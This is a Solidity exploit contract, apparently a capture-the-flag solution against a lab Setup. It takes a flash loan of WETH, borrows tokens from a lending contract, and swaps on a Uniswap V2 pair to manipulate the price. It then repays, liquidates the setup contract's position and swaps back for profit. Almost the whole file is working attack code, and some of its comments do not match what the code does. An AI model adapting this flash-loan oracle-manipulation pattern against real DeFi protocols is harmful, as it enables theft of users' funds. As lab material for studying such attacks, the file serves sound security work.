// SPDX-License-Identifier: private

pragma solidity 0.8.0;

import "./Setup.sol";

contract Exploit {
    // AMM model of k = a * b
    IUniswapV2Pair public pair;
    // a reference to the lender
    Lender public lender;
    // the 2 specific tokens involved
    Token public token;
    WETH9 public weth;
    // flash loan provider
    FlashLoan public flashloanPool;
    // a reference to setup contract
    Setup public setup;
    
    uint256 constant DECIMALS = 1 ether;
    
    uint256 public constant loanAmount = 1000 ether;
    uint256 public constant collateralAmount = 50 ether;
    uint256 public constant swapAmount = loanAmount-collateralAmount;


    // we initialize all previous variables in the constructor
    // based on our development environment data
    constructor(Setup _setup) {
        // 1 extract from existing Setup contract all available data to be in sync
        setup = _setup;
        weth = setup.weth();
        //factory = setup.factory();
        token = setup.token();
        pair = setup.pair();
        lender = setup.lender();
        flashloanPool = setup.flashloanPool();
        // now request a flash loan an borrow some third party weth
        // after requesting flashloan a max of 1000 weth will be transfered to this exploit balance
        // and callback method receiveFlashLoan(uint256) will be executed
        // ** receiveFlashLoan is called **/
    }

    function attack() public {
        flashloanPool.flashLoan(loanAmount);
    }

    function receiveFlashLoan(uint256 amount) public {
        manualAttack();
        // return the loan
        weth.transfer(address(flashloanPool), amount);
    }

    function manualAttack() internal {
        step2();
        step3();
        step4();
        step5();
        step6();
        step7();
        step8();
    }

    function step1() public payable {
        // 1 get some weth
        require(msg.value==loanAmount);
        weth.deposit{value: loanAmount}();
    }

    function step2() internal {
        // 2 approve
        uint256 maxAmount = type(uint256).max;
        
        // transfer weth to this contract
        weth.approve(address(this), maxAmount);
        weth.approve(address(pair), maxAmount);
        weth.approve(address(lender), maxAmount);

        token.approve(address(this), maxAmount);
        token.approve(address(lender), maxAmount);
        token.approve(address(lender), maxAmount);

        lender.deposit(collateralAmount);
        lender.borrow(250_000 * DECIMALS);
    }

    function step3() internal {
        // send borrowed tokens to the pair
        // if we dont, we will end up with them for nothing
        //uint256 tokenBalance = token.balanceOf(address(this));
        //require( token.transferFrom(address(this), address(pair), tokenBalance), "transferFrom failed");
        // 3 transfer weth to the pair
        require(swapAmount > 0, "no weth on contract to swap");
        require( weth.transferFrom(address(this), address(pair), swapAmount), "transferFrom failed");
    }

    function step4() internal {
        require(swapAmount > 0, "no weth on contract to swap");
        // we get 375K in exchange
        // initial pool balance: 950+25 eth
        // 750k tokens = 500 + 250
        pair.swap(475_000 ether, 0, address(this), '');
    }  
    
    function step5() internal {
        lender.repay(250_000 * DECIMALS);
    }
    function step6() internal {
        lender.withdraw(collateralAmount);
    }

    function step7() internal {
        // 25 is the multiplier
        lender.liquidate(address(setup), 25*25 ether);
    }

    function step8() internal {
        // swap tokens back
        uint256 tokenBalance = token.balanceOf(address(this));
        require( token.transferFrom(address(this), address(pair), tokenBalance), "transferFrom failed");
        pair.swap(0, 925 ether, address(this), '');
    }

}
